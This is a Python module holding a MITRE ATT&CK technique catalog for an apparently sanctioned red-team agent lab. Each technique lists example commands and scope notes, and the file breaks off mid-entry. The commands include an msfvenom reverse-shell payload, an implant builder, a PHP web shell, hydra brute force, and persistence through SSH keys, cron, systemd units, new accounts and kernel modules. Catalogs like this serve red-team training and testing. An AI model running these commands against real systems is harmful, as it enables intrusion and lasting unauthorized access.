"""MITRE ATT&CK catalog for the Coder56 pentest goal-builder.

Single source of truth for the tactic/technique catalog surfaced in the
standalone Coder56 console (GET /api/coder56/mitre/catalog) and referenced by
the goal/draft + goal/compile endpoints. Authored by the mitre-kb-author
workflow (one agent per tactic); this module holds the assembled result.

Curated catalog for an AUTHORIZED, isolated cyber-range lab. Technique entries
intentionally carry representative CLI commands — coder56 is a sanctioned
red-team simulation subsystem.
"""
from __future__ import annotations

from typing import Any, Dict, List

# Auto-generated from the mitre-kb-author workflow. Do not hand-edit the data;
# re-run the workflow and regenerate. Each tactic:
#   {id, name, phase, description, guidance,
#    techniques: [{id, name, description, typical_commands, scope_notes}]}
MITRE_TACTICS: List[Dict[str, Any]] = [
  {
    "id": "TA0042",
    "name": "Resource Development",
    "phase": 1,
    "description": "The adversary is building, acquiring, and staging the infrastructure, tools, and capabilities they will use to support operations before they ever touch the target network. This includes registering domains, renting or compromising staging servers, writing or modifying implants and exploits, and harvesting credentials, code, or signing material from public sources or prior access.",
    "guidance": "Treat Resource Development as prep work done against your OWN attacker-controlled assets, never the engagement target. Build, stage, and test payloads on isolated attacker boxes you own; when you must pull information about the target (e.g., DNS, public repos, exposed code), touch only the specific hostnames/repos in the engagement scope and do NOT mass-scan or enumerate the victim's wider footprint. Confirm every target identifier (FQDN, CIDR, account) against the authorized scope before using it, and treat any credential or third-party key as single-use, lab-scoped material that must not leak outside the range. Caution: acquiring or weaponizing real credentials/signing keys carries real-world liability — keep all such material synthesized, self-generated, or confined to the range.",
    "techniques": [
      {
        "id": "T1583",
        "name": "Acquire Infrastructure",
        "description": "The adversary rents, leases, registers, or otherwise obtains servers, domains, hosting accounts, or cloud resources they control, to use later for command-and-control, phishing landing pages, or payload staging.",
        "typical_commands": [
          "dig +short NS in-addr.arpa 10.77.0.0/24",
          "whois 10.77.10.5",
          "caddy reverse-proxy --from 10.77.99.10:8443 --to 127.0.0.1:9001",
          "python3 -m http.server 8080 --bind 10.77.99.10 --directory /srv/stage",
          "ssh -N -L 8443:10.77.10.5:443 operator@10.77.99.10"
        ],
        "scope_notes": "IN scope: standing up C2/staging servers, listeners, and redirectors on attacker-owned boxes inside the lab (e.g., the 10.77.99.x operator subnet) that the engagement explicitly assigns to you. OUT of scope: registering real public domains or renting real cloud/billing accounts, and any reconnaissance of infrastructure you do not own outside the lab CIDR."
      },
      {
        "id": "T1583.001",
        "name": "Acquire Infrastructure: Domains",
        "description": "The adversary obtains domain names (registering, buying on the secondary market, or using free dynamic-DNS/subdomain services) that can mimic the target's brand and lend legitimacy to C2, phishing, or staging infrastructure.",
        "typical_commands": [
          "dig +short A lab-target.local",
          "dig +short CNAME files.lab-target.local",
          "whois lab-target.local | grep -iE 'registrar|name server|status'",
          "dnsmasq --address=/c2.lab-target.local/10.77.99.10 --local-service"
        ],
        "scope_notes": "IN scope: enumerating the lab's internal DNS namespace (lab-target.local and assigned subnets) and binding attacker aliases on your own resolver/staging box. OUT of scope: registering real public TLDs, typosquatting real external brands, or purchasing domains with real currency against any production identity."
      },
      {
        "id": "T1587",
        "name": "Develop Capabilities",
        "description": "The adversary writes, compiles, or adapts custom malware, implants, exploits, and supporting tooling (loaders, C2 clients, obfuscation scripts) tailored to the target environment before the intrusion begins.",
        "typical_commands": [
          "go build -o ./build/stager -ldflags='-s -w' ./cmd/stager",
          "gcc -O2 -pie -o ./build/loader ./src/loader.c",
          "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.77.99.10 LPORT=443 -f elf -o ./build/payload.elf",
          "strip --strip-all ./build/payload.elf && upx -9 ./build/payload.elf"
        ],
        "scope_notes": "IN scope: compiling, packing, and testing payloads entirely on attacker-controlled build/staging hosts within the lab, with LHOST pointing only at operator-owned addresses. OUT of scope: deploying weaponized artifacts against any host not on the authorized target list, and incorporating real zero-day material obtained from outside the range."
      },
      {
        "id": "T1587.001",
        "name": "Develop Capabilities: Malware",
        "description": "The adversary authors or modifies malicious code such as reverse shells, implant beacons, rootkit components, or covert-C2 modules, often adapting open-source implants to evade the lab's defenders.",
        "typical_commands": [
          "python3 ./tools/build_implant.py --addr 10.77.99.10 --port 8443 --jitter 20 --out ./build/implant",
          "gcc -shared -fPIC -o ./build/libhide.so ./src/hide.c",
          "openssl enc -aes-256-cbc -in ./build/implant -out ./build/implant.enc -k \"$(cat ./keys/stage.key)\"",
          "go test ./src/implant/... -run TestBeacon"
        ],
        "scope_notes": "IN scope: writing/building/testing implant and loader code on attacker boxes, with beacons pointing only at operator-owned C2 addresses. OUT of scope: running the compiled malware against any non-scoped host, persisting on shared lab infrastructure, or shipping implants off the range to external systems."
      },
      {
        "id": "T1588",
        "name": "Obtain Capabilities",
        "description": "The adversary acquires tools, exploits, and helpers they did not write themselves — downloading open-source offensive tools, pulling private/exploit code from public leaks or marketplaces, or buying ready-made tooling.",
        "typical_commands": [
          "git clone --depth 1 https://github.com/ropnop/kerbrute.git ./tools/kerbrute",
          "go install github.com/vanhauser-thc/thc-hydra/v9@latest",
          "curl -fsSL -o ./tools/nmap-7.94.tar.bz2 https://nmap.org/dist/nmap-7.94.tar.bz2 && sha256sum ./tools/nmap-7.94.tar.bz2",
          "pip install --user --require-hashes -r ./tools/requirements.txt"
        ],
        "scope_notes": "IN scope: pulling well-known, freely licensed offensive tools (nmap, hydra, kerbrute, etc.) from their official sources into your attacker toolkit and verifying checksums/signatures before use. OUT of scope: obtaining stolen credentials, leaked private exploits, or any commercial/cracked tooling, and running downloaded binaries against anything other than the scoped engagement hosts."
      },
      {
        "id": "T1588.006",
        "name": "Obtain Capabilities: Vulnerabilities",
        "description": "The adversary collects or purchases knowledge of specific software flaws and proof-of-concept exploits (CVE details, public PoCs) to weaponize against vulnerable services observed on the target during pre-engagement research.",
        "typical_commands": [
          "searchsploit -x --nmap ./recon/lab-target-services.xml",
          "searchsploit -m 50483 -o ./exploits/50483.py",
          "nmap --script vuln -p 22,80,443,445 10.77.10.5 -oA ./recon/lab-target-vuln",
          "head -n 40 ./exploits/50483.py"
        ],
        "scope_notes": "IN scope: searching a local Exploit-DB mirror and matching CVEs against services identified on the specific scoped hosts, then reading/extracting PoC text for review. OUT of scope: broad internet vulnerability scanning of non-target systems, mass-downloading exploit packs, or applying destructive/untested exploits that risk crashing scoped services."
      }
    ]
  },
  {
    "id": "TA0043",
    "name": "Reconnaissance",
    "phase": 1,
    "description": "The adversary is trying to gather information they can use to plan future operations. Reconnaissance consists of techniques that involve adversaries actively or passively gathering information about the target network, hosts, services, and credentials to use in planning and executing later stages of the attack lifecycle.",
    "guidance": "Careful recon against an authorized engagement target means: first confirm the exact in-scope IP/CIDR from the engagement goal, then enumerate only that host or subnet with the lightest viable technique (ARP/neighbor table, single-target host discovery, version probes on a bounded port set). Prefer targeted TCP connect checks or `-sV` on one host over broad sweeps, and read local network/host state (ip, arp, /etc/hosts, DNS) before sending any packets. Caution: never scan a subnet wider than the engagement target (e.g. the shared 172.25.0.0/24 playground or sibling topologies are OUT of scope), avoid aggressive timing/noise that trips the defender's IDS without a mission need, and confirm the target is alive and in-scope before escalating to service-level enumeration.",
    "techniques": [
      {
        "id": "T1595.002",
        "name": "Active Scanning: Vulnerability Scanning",
        "description": "Adversaries scan the in-scope target to enumerate open ports, running services, and software versions, building a map used to plan later exploitation. In a lab this is targeted nmap service/version detection against the single authorized host.",
        "typical_commands": [
          "nmap -sV -sT -p 1-1000 --max-rate 100 10.77.1.11",
          "nmap -sV -p 22,80,443 10.77.1.11",
          "nmap -Pn -sV --top-ports 50 -T2 10.77.1.11"
        ],
        "scope_notes": "IN scope: nmap service/version scans against the single authorized engagement host (e.g. 10.77.1.11). OUT of scope: scanning an entire /24 or the shared 172.25.0.0/24 playground, scanning sibling topologies, or aggressive/-A full sweeps with no mission need. Cap rate and port range to the engagement host only."
      },
      {
        "id": "T1595.001",
        "name": "Active Scanning: Scanning IP Blocks",
        "description": "Adversaries sweep a range of addresses to discover which hosts in the engagement subnet are alive, so they can focus subsequent activity on responsive targets. Host discovery here is confined to the authorized engagement CIDR.",
        "typical_commands": [
          "nmap -sn 10.77.1.0/24",
          "nmap -sn -PE 10.77.1.11-13",
          "for h in 10.77.1.{11,12,13}; do ping -c1 -W1 $h; done"
        ],
        "scope_notes": "IN scope: host-discovery (ping/-sn) limited strictly to the authorized engagement subnet (e.g. the target's own 10.77.1.0/24). OUT of scope: sweeping the shared 172.25.0.0/24 management network, other tenants' subnets, or arbitrary public ranges. A sweep beyond the engagement CIDR is a scope violation even if it looks like 'just ping'."
      },
      {
        "id": "T1046",
        "name": "Network Service Discovery",
        "description": "Adversaries enumerate services reachable on the target and across the authorized subnet to find exposed management interfaces, shares, databases, or login services worth attacking. This is the service-level discovery that follows host discovery.",
        "typical_commands": [
          "nmap -sT -p 21,22,23,25,53,80,139,443,445,3306,3389,5432,8080 10.77.1.11",
          "nmap -sT -p- --min-rate 200 10.77.1.11",
          "nc -zv -w2 10.77.1.11 22 80 443"
        ],
        "scope_notes": "IN scope: port/service enumeration against the authorized engagement host(s). OUT of scope: scanning services on the playground/management interface or hosts outside the engagement. Full-range (-p-) scans are acceptable on the single in-scope target but not on the shared management network."
      },
      {
        "id": "T1592.004",
        "name": "Gather Target Host Information: Client Configurations",
        "description": "Adversaries read local network and host configuration (interfaces, routes, ARP/neighbor table, DNS resolvers, hosts file) to understand topology, find reachable subnets, and identify candidate targets from their foothold. This is passive, local-only reading — no packets sent to the target yet.",
        "typical_commands": [
          "ip addr; ip route; arp -a; ip neigh",
          "cat /etc/hosts; cat /etc/resolv.conf",
          "hostname; ip -br addr"
        ],
        "scope_notes": "IN scope: reading local interface, route, ARP, and resolver state on the agent's own foothold host to orient within the engagement. OUT of scope: using this information to pivot to or enumerate subnets/hosts named in the engagement as off-limits. No remote packets are generated; this is the safest recon tier."
      },
      {
        "id": "T1592",
        "name": "Gather Target Host Information",
        "description": "Adversaries gather details about the engagement target host — open ports, banners, OS fingerprint, and running software — to characterize it before choosing an attack path. This complements active scanning with banner-grabbing and OS detection on the single authorized host.",
        "typical_commands": [
          "nmap -O -sV --version-intensity 5 10.77.1.11",
          "nmap -sV --script banner -p 22,80,443,8080 10.77.1.11",
          "curl -sI -m5 http://10.77.1.11/",
          "nc -v -w3 10.77.1.11 22"
        ],
        "scope_notes": "IN scope: OS fingerprint, banner-grab, and HTTP header checks against the single authorized engagement host. OUT of scope: gathering host info on the shared playground/management network, on out-of-scope sibling hosts, or on external systems. Banner-grabbing off-scope hosts is still a scope violation."
      }
    ]
  },
  {
    "id": "TA0001",
    "name": "Initial Access",
    "phase": 2,
    "description": "The adversary is trying to get into your network. Initial Access consists of techniques that use various entry vectors to gain their first foothold within a network.",
    "guidance": "Confirm the engagement target (specific host/CIDR) before any network interaction, and treat every Initial Access attempt as scoped to that single declared target — no broad sweep of adjacent subnets or unrelated hosts. Good execution means one carefully aimed probe (e.g., a credential guess against one declared SSH service, or a payload pointed at one validated web endpoint), then verifying the foothold before expanding. Caution: avoid mass-scanning, credential spraying that risks lockouts, and any payload with destructive or self-propagating behavior.",
    "techniques": [
      {
        "id": "T1190",
        "name": "Exploit Public-Facing Application",
        "description": "Adversaries exploit a vulnerability in an internet- or network-facing application (web server, CMS, API, framework) to gain code execution or unauthorized access as the initial foothold.",
        "typical_commands": [
          "nmap -sV -p 80,443,8080 --script http-enum,http-headers TARGET",
          "curl -sk -o /dev/null -w '%{http_code}' http://TARGET/ ; echo",
          "sqlmap -u 'http://TARGET/login?user=test&pass=test' --batch --level=1 --risk=1 --dbs",
          "nikto -h http://TARGET -Tuning 1 -maxtime 120s"
        ],
        "scope_notes": "IN scope: a single declared web target and only the specific vulnerable endpoint you have been asked to validate. OUT of scope: crawling/scanning unrelated virtual hosts, blind exploitation that writes/deletes data, or deploying web shells with persistent backdoors beyond the lab's session."
      },
      {
        "id": "T1110.001",
        "name": "Password Guessing",
        "description": "Adversaries guess passwords for accounts, typically attempting a small number of passwords per account to avoid lockouts and detection, often using knowledge of organizational or default credentials.",
        "typical_commands": [
          "hydra -t 4 -l root -P /usr/share/wordlists/top-20.txt -f ssh://TARGET",
          "medusa -u admin -P short-list.txt -h TARGET -M ssh -T 4",
          "ncrack -vv --user root -P top-10.txt ssh://TARGET"
        ],
        "scope_notes": "IN scope: password validation against one declared service (SSH/RDP/FTP) on one target, using a bounded wordlist (<= ~25 entries) and low thread count. OUT of scope: large-dictionary password spraying, brute force likely to trigger account lockout, and credential attempts against any host other than the declared target."
      },
      {
        "id": "T1078",
        "name": "Valid Accounts",
        "description": "Adversaries use credentials (compromised, default, or socially obtained) for legitimate accounts to gain initial access, blending in as authorized users rather than exploiting a vulnerability.",
        "typical_commands": [
          "ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 labuser@TARGET 'id; hostname'",
          "sshpass -p 'provided_cred' ssh -o StrictHostKeyChecking=accept-new labuser@TARGET 'uname -a'",
          "curl -sk -u 'admin:admin' http://TARGET/admin/ -o /dev/null -w 'HTTP %{http_code}\\n'"
        ],
        "scope_notes": "IN scope: logging in with credentials explicitly provided by the lab scope or known-default credentials (e.g., admin:admin) on one declared target. OUT of scope: reusing captured credentials against unrelated systems/hosts, privilege escalation post-login (that belongs to Privilege Escalation), and any action that changes the account's password or profile."
      },
      {
        "id": "T1195.002",
        "name": "Compromise Software Supply Chain: Compromise Software Supply Chain",
        "description": "Adversaries manipulate a dependency, package, or update mechanism (e.g., a malicious pip/npm package or a tampered update server) so that the target pulls and runs attacker-controlled code during install.",
        "typical_commands": [
          "pip download --no-deps --no-binary :all: -d /tmp/pkg PKGNAME 2>&1 | tail -5",
          "npm view PACKAGENAME dist.tarball; curl -sL \"$(npm view PACKAGENAME dist.tarball)\" | tar -tz | head",
          "nslookup -type=CNAME TARGET-update-server 2>/dev/null | tail -n +4"
        ],
        "scope_notes": "IN scope: inspecting/downloading a suspicious package or update endpoint for analysis within the isolated lab, against the lab's own configured mirrors/repositories only. OUT of scope: publishing packages to public registries, injecting malware into external/shared supply chains, or modifying update servers reachable outside the engagement."
      },
      {
        "id": "T1199",
        "name": "Trusted Relationship",
        "description": "Adversaries leverage access or privileges granted to a trusted third party, integrated service, or connected system (shared admin account, contractor VPN, monitoring agent, API integration) as an initial entry point into the environment.",
        "typical_commands": [
          "ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 trustuser@TARGET 'ls -la ~/.ssh'",
          "curl -sk http://TARGET:9090/api/v1/status -H 'Authorization: Bearer <scope_token>' -w '\\nHTTP %{http_code}\\n'",
          "redis-cli -h TARGET -p 6379 -a 'provided_token' PING 2>/dev/null"
        ],
        "scope_notes": "IN scope: using a single pre-established trust channel (integration token, shared account, monitoring API) on one declared target to demonstrate the foothold. OUT of scope: pivoting laterally through the trust relationship to other connected organizations, and abusing the trusted channel to exfiltrate or alter data beyond proving access."
      },
      {
        "id": "T1133",
        "name": "External Remote Services",
        "description": "Adversaries use externally exposed remote-access services (VPN, SSH gateway, exposed RDP/VNC, remote management port) to reach the internal network and establish an initial entry point.",
        "typical_commands": [
          "nmap -sV -p 22,3389,5900,1194,4500,8443 TARGET",
          "openvpn --config lab-engagement.ovpn --auth-nocache --connect-timeout 20 --daemon vpn-probe && sleep 3 && ip a show tun0",
          "ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 -p 8443 jumpuser@TARGET 'hostname'"
        ],
        "scope_notes": "IN scope: connecting to one declared exposed remote-access service (one VPN profile or one jump host) explicitly within the engagement scope. OUT of scope: scanning for or connecting to any remote-access service on non-target networks, creating persistent VPN tunnels that survive the engagement, and enabling port forwards beyond what the lab topology defines."
      }
    ]
  },
  {
    "id": "TA0002",
    "name": "Execution",
    "phase": 3,
    "description": "The adversary runs code or commands on a target to advance their objective. In a Linux-network lab this means executing shells, scripts, and binaries on scoped hosts to validate access, run offensive tooling, and prove an exploit path — all against the single named engagement target.",
    "guidance": "Execute only on the confirmed engagement target (the specific host or /32 named in the goal) and prefer the least-invasive command that proves the point — a single id/whoami/uname over a reverse shell when a foothold proof suffices. Confirm the target IP/hostname against the engagement scope before every execution, and route commands explicitly (per-host), never blindly against a whole subnet. Caution: do not install persistence (backdoors, scheduled jobs that survive reboot, dropped binaries in system paths), do not stage or exfiltrate data, and do not run mass/parallel execution across non-target hosts — those drift out of scope even when initiated from a valid foothold.",
    "techniques": [
      {
        "id": "T1059.004",
        "name": "Command and Scripting Interpreter: Unix Shell",
        "description": "Run commands and short scripts through a Unix shell (sh, bash) to interact with the compromised host, chain tools, and parse output. This is the primary day-to-day execution channel for an offensive agent on Linux.",
        "typical_commands": [
          "id && whoami && hostname && uname -a",
          "bash -c 'cat /etc/os-release; ip addr show'",
          "TARGET=10.77.0.11; ssh user@$TARGET 'id; uname -a'",
          "for p in 22 80 443; do (echo > /dev/tcp/10.77.0.11/$p) >/dev/null 2>&1 && echo \"$p open\"; done"
        ],
        "scope_notes": "IN scope: running reconnaissance, enumeration, and credential-recovery commands against the single engagement target IP only. OUT of scope: spawning interactive/bind reverse shells, executing shell loops that sweep a whole subnet or non-target hosts, or chaining commands to drop persistence (e.g. writing .bashrc or authorized_keys via shell redirects)."
      },
      {
        "id": "T1059.006",
        "name": "Command and Scripting Interpreter: Python",
        "description": "Use the Python interpreter to execute logic that is awkward in pure shell — decoding payloads, parsing service output, or running quick exploits against a validated target.",
        "typical_commands": [
          "python3 -c 'import socket; s=socket.socket(); s.settimeout(2); s.connect((\"10.77.0.11\",80)); print(s.recv(256))'",
          "python3 -m http.server 8080 --bind 127.0.0.1",
          "python3 -c 'import base64,json; print(json.dumps({\"cmd\":\"id\"}))'"
        ],
        "scope_notes": "IN scope: one-off Python snippets that connect to, or parse data from, the named engagement target. OUT of scope: starting a long-lived listener/exfil server bound to 0.0.0.0, running a credential-spray or exploit script across multiple hosts, or downloading/executing a remote payload into the target filesystem."
      },
      {
        "id": "T1106",
        "name": "Native API",
        "description": "Invoke the operating system's native C/libc API surface indirectly through compiled tools and syscalls (socket connect, execve via tools) to interact with the target without spawning a full shell, reducing footprint.",
        "typical_commands": [
          "nc -vz -w2 10.77.0.11 22",
          "curl -sS -m5 -o /dev/null -w '%{http_code}\\n' http://10.77.0.11/",
          "objdump -d ./target_binary | head -40",
          "strace -e trace=network -f -p 1 2>&1 | head"
        ],
        "scope_notes": "IN scope: targeted connection, banner-grab, or local binary inspection against the single engagement host. OUT of scope: attaching strace/gdb to system processes for stealth, calling ptrace-based injection, or using native socket APIs to pivot traffic into non-target segments (lateral movement)."
      },
      {
        "id": "T1204.002",
        "name": "User Execution: Malicious File",
        "description": "Trigger execution of a file that arrived on the host (a downloaded tool, a recovered script, a served payload) by marking it executable and running it. In a lab this validates whether an exploit-delivered or staged artifact actually runs.",
        "typical_commands": [
          "chmod +x ./recovered_tool && file ./recovered_tool",
          "./recovered_tool --help",
          "bash ./recovered_script.sh --target 10.77.0.11",
          "perl recovered.pl 10.77.0.11"
        ],
        "scope_notes": "IN scope: executing an already-present binary/script purely to validate behavior or run an in-scope assessment against the engagement target, after a file-type sanity check. OUT of scope: fetching a fresh payload from an external/attacker URL and executing it (implant delivery), or running the file against any non-target host."
      },
      {
        "id": "T1053.003",
        "name": "Scheduled Task/Job: Cron",
        "description": "Abuse the cron daemon to schedule recurring command execution, enabling a foothold that survives process exit. In an authorized lab this technique is documented as the persistence/execution boundary — actually arming it is out of scope.",
        "typical_commands": [
          "crontab -l",
          "ls -la /etc/cron* /var/spool/cron/ 2>/dev/null",
          "cat /etc/crontab",
          "ls -la /etc/cron.d/ && echo '---' && cat /etc/cron.d/* 2>/dev/null"
        ],
        "scope_notes": "IN scope: read-only inspection of existing cron entries to assess the host's scheduled-task attack surface. OUT of scope: writing, installing, or modifying any cron/crontab/at job to establish recurring execution or a reboot-surviving backdoor — that is persistence and exceeds an assessment objective."
      }
    ]
  },
  {
    "id": "TA0003",
    "name": "Persistence",
    "phase": 4,
    "description": "Persistence is the adversary's attempt to maintain access across restarts, credential changes, or interruptions. On Linux network hosts this means planting re-executable footholds (services, scheduled jobs, web shells, SSH keys, or new accounts) so a single lost session does not end the engagement.",
    "guidance": "Persistence is always an intentional, documented step: confirm the target host is the in-scope engagement box (IP/hostname matches the engagement scope) and that you already have a working session before planting anything. Prefer the least-invasive, easily-removed foothold that survives a reboot (an SSH authorized_keys entry or a single systemd unit on the one target host). Modify only the specific user's files you intend to own; never mass-deploy across subnets, never overwrite existing services/cron/system files, and never create destructive or resource-consuming payloads. Record exactly what file/unit/key you added so it can be cleanly reverted, and leave any existing credential or config untouched.",
    "techniques": [
      {
        "id": "T1098.004",
        "name": "Account Manipulation: SSH Authorized Keys",
        "description": "Add or modify an account's credentials to retain access, most commonly by appending the operator's public key to a user's ~/.ssh/authorized_keys so future logins survive password resets and reboot.",
        "typical_commands": [
          "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-ed25519 AAAA...keycomment' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
          "ssh-keygen -t ed25519 -f /tmp/operator_key -N '' && cat /tmp/operator_key.pub",
          "cp ~/.ssh/authorized_keys /tmp/authorized_keys.bak.$(date +%s)  # snapshot before edit",
          "stat -c '%U:%G %a %n' ~/.ssh ~/.ssh/authorized_keys  # verify restrictive perms"
        ],
        "scope_notes": "IN scope: appending the operator's own key to the authorized_keys of an account on the single in-scope target host. OUT of scope: modifying root's key on out-of-scope hosts, copying/sharing real user credentials elsewhere, or touching /etc/shadow hash fields destructively."
      },
      {
        "id": "T1053.006",
        "name": "Scheduled Task/Job: Cron",
        "description": "Schedule a recurring job via the cron daemon so a payload, callback, or maintenance task re-runs at a fixed time without an interactive session.",
        "typical_commands": [
          "(crontab -l 2>/dev/null; echo '*/15 * * * * /home/operator/.local/heartbeat.sh >> /tmp/hb.log 2>&1') | crontab -",
          "crontab -l  # review current entries before/after",
          "echo '0 3 * * * operator /usr/local/bin/maint.sh' | sudo tee /etc/cron.d/operator-maint",
          "crontab -r --help 2>/dev/null || crontab -l > /tmp/crontab.bak.$(date +%s)  # back up, do not blindly -r"
        ],
        "scope_notes": "IN scope: adding one user crontab entry or a single file under the in-scope user's spool on the named target host. OUT of scope: overwriting system-wide /etc/cron.* or another user's crontab, creating high-frequency runaway jobs, or planting cron on every host in a subnet."
      },
      {
        "id": "T1543.002",
        "name": "Create or Modify System Process: Systemd Service",
        "description": "Create or install a systemd unit so a service, timer, or oneshot payload starts at boot or restarts automatically if it exits, surviving reboots and process kills.",
        "typical_commands": [
          "mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/operator-heartbeat.service <<'EOF'\\n[Unit]\\nDescription=Operator heartbeat\\n[Service]\\nExecStart=/home/operator/.local/heartbeat.sh\\n[Install]\\nWantedBy=default.target\\nEOF",
          "systemctl --user daemon-reload && systemctl --user enable --now operator-heartbeat.service",
          "systemctl --user status operator-heartbeat.service --no-pager",
          "systemctl --user disable --now operator-heartbeat.service  # revert path"
        ],
        "scope_notes": "IN scope: installing one new unit in the in-scope user's scope (~/.config/systemd/user) or a clearly named root unit on the single target host. OUT of scope: replacing core system services (sshd, networking), installing units on hosts outside engagement scope, or setting Restart=always on resource-heavy payloads that could DoS the box."
      },
      {
        "id": "T1136.001",
        "name": "Create Account: Local Account",
        "description": "Create a new local account with known credentials so the operator can log back in independently of any compromised existing account or session token.",
        "typical_commands": [
          "sudo useradd -m -s /bin/bash operator_svc && echo 'operator_svc:S3cret!change' | sudo chpasswd",
          "id operator_svc  # confirm uid/gid, ensure not 0",
          "sudo usermod -L operator_svc  # lock password if key-only; reversible",
          "getent passwd operator_svc  # verify the account exists as intended"
        ],
        "scope_notes": "IN scope: creating one clearly-labeled non-root operator account on the in-scope target host, password set non-interactively. OUT of scope: creating UID 0 / root-equivalent accounts, adding accounts to other hosts, disabling or renaming existing users, or weakening the host's auth policy."
      },
      {
        "id": "T1505.003",
        "name": "Server Software Component: Web Shell",
        "description": "Plant a shell or command endpoint inside a web service's served directory so the operator can re-execute commands through the web server even after the initial foothold session ends.",
        "typical_commands": [
          "ls -ld /var/www/html 2>/dev/null; ls -ld /usr/share/nginx/html 2>/dev/null  # locate webroot first",
          "echo '<?php if($_GET[\"c\"]){system($_GET[\"c\"]);} ?>' | sudo tee /var/www/html/.maintenance.php",
          "curl -s 'http://127.0.0.1/.maintenance.php?c=id'  # test locally on target",
          "sudo rm -f /var/www/html/.maintenance.php  # documented revert step"
        ],
        "scope_notes": "IN scope: dropping one web shell into the in-scope target's own webroot for re-access. OUT of scope: planting shells across multiple hosts, leaving network listeners/bind-shells on arbitrary ports, or using the shell for mass scanning or destructive commands."
      },
      {
        "id": "T1547.006",
        "name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
        "description": "Load a kernel module (or persistence hook) that runs in ring 0 at boot or on demand, giving a deep, reboot-surviving foothold that is hard to detect from userspace.",
        "typical_commands": [
          "lsmod | sort  # inventory currently loaded modules",
          "modinfo operator_test 2>/dev/null  # inspect a module before loading",
          "sudo insmod /home/operator/operator_test.ko && lsmod | grep operator_test",
          "sudo rmmod operator_test  # revert; verify dmesg for errors after"
        ],
        "scope_notes": "IN scope (only with explicit authorization): building/loading a single labeled test module on the single in-scope target, with a documented rmmod revert. OUT of scope / use with extreme caution: loading modules on out-of-scope hosts, modules that hide processes/files (rootkit behavior), or anything that risks a kernel panic — this is the highest-impact persistence vector and should be avoided unless the lab task specifically requires it."
      }
    ]
  },
  {
    "id": "TA0004",
    "name": "Privilege Escalation",
    "phase": 5,
    "description": "The adversary is trying to gain higher-level permissions on a target Linux host — typically escalating from an initial low-privilege shell to root. Privilege escalation often overlaps with persistence and defense evasion, because many of the same access mechanisms (sudo, SUID binaries, cron jobs) can be reused after rights are gained.",
    "guidance": "Privilege escalation in this lab is a point-in-time, host-local action against ONE confirmed, in-scope target — never a mass-scan or a sweep across the network. Careful execution means: enumerate first on the single host you have already compromised (kernel version, sudo -l, SUID/SGID files, writable cron/systemd paths, exposed creds), pick the lowest-impact path that fits that exact version, and validate it before acting. Prefer read-only enumeration and a non-destructive proof (e.g., `id` running as root) over installing new tools or changing system state. CAUTION: never run kernel panics, fork bombs, `chmod -R` on system dirs, mass brute force of passwords, or any exploit that crashes/reboots the box — and confine every command to the engagement-scoped CIDR/host.",
    "techniques": [
      {
        "id": "T1068",
        "name": "Exploitation for Privilege Escalation",
        "description": "Exploitation of software vulnerabilities in an installed program, service, or the kernel to execute code with elevated privileges. On Linux this is most often a SUID/sudo misconfiguration, a vulnerable setuid binary, or a local kernel CVE (e.g., Dirty Pipe, OverlayFS, eBPF) that turns a low-privilege user into root.",
        "typical_commands": [
          "uname -a",
          "hostnamectl 2>/dev/null; cat /etc/os-release",
          "sudo -l",
          "searchsploit \"$(uname -r)\" 2>/dev/null || echo 'kernel: '$(uname -r)"
        ],
        "scope_notes": "IN scope: enumerate kernel/OS version and installed-software version strings, and verify a candidate CVE matches the exact version on the single engagement target before exploitation. OUT of scope: mass-exploiting or scanning other hosts for the CVE, running unverified PoCs that panic/oops the kernel, or installing rootkits/backdoors. Exploit only the host named in the engagement scope."
      },
      {
        "id": "T1548.001",
        "name": "Setuid and Setgid",
        "description": "Adversaries abuse the setuid/setgid permission bits, which cause a binary to execute with the privileges of its owning user/group (often root) regardless of who launches it. The attacker finds SUID/SGID binaries — especially custom or misconfigured ones — and uses them to spawn a root shell.",
        "typical_commands": [
          "find / -xdev \\( -perm -4000 -o -perm -2000 \\) -type f -exec ls -l {} \\; 2>/dev/null",
          "ls -l /usr/bin/find /usr/bin/vim.basic /usr/bin/python3 2>/dev/null",
          "# candidate check only: /usr/bin/find . -exec /usr/bin/id \\;"
        ],
        "scope_notes": "IN scope: enumerate SUID/SGID binaries on the target host and test known-abusable ones (find/vim/python/nmap/perl/bash) against GTFOBins to confirm they execute as root. OUT of scope: planting new SUID binaries, editing permissions on system files, or touching hosts outside the engagement target. Treat any write/plant of a SUID binary as out of scope — only abuse what already exists."
      },
      {
        "id": "T1548.003",
        "name": "Sudo and Sudo Caching",
        "description": "Adversaries abuse sudo configuration or the cached sudo credential timestamp to run commands as root. This includes binaries allowed via sudo (NOPASSWD entries, GTFOBins-style sudo abuse), reused/shared credentials, or hijacking another user's still-valid sudo session.",
        "typical_commands": [
          "sudo -l",
          "sudo -n -l 2>/dev/null",
          "ls -l /etc/sudoers /etc/sudoers.d/ 2>/dev/null"
        ],
        "scope_notes": "IN scope: reviewing the current user's own sudo -l rules and using an explicitly-allowed binary as root on the engagement target. OUT of scope: brute-forcing sudo passwords, modifying /etc/sudoers to grant privileges, or escalating on any host other than the one in scope. Do not clear/tamper with other users' sudo timestamp files."
      },
      {
        "id": "T1078.003",
        "name": "Local Accounts",
        "description": "Adversaries use credentials of existing local accounts (reused passwords, weak service-account passwords, shared root credentials, or hashed credentials harvested from the box) to pivot into a higher-privileged account such as root or a member of the sudo/admin group.",
        "typical_commands": [
          "cat /etc/passwd | grep -v 'nologin\\|false'",
          "awk -F: '$3==0 {print}' /etc/passwd",
          "getent group sudo wheel adm 2>/dev/null",
          "sudo -n true 2>/dev/null && echo 'passwordless sudo active'"
        ],
        "scope_notes": "IN scope: enumerating local accounts, uid-0 users, and privileged groups on the target, and attempting a known/already-harvested credential against sudo on that host. OUT of scope: online password brute force or spraying against the host, creating/adding new accounts, and any account activity on non-engagement hosts."
      },
      {
        "id": "T1053.003",
        "name": "Cron",
        "description": "Adversaries abuse the cron job scheduler to execute commands as root (or another privileged user). If a root-run cron entry calls a script the low-privilege user can write to, or cron.d entries are world-writable, the attacker edits that script to run arbitrary code at the next scheduled tick with root privileges.",
        "typical_commands": [
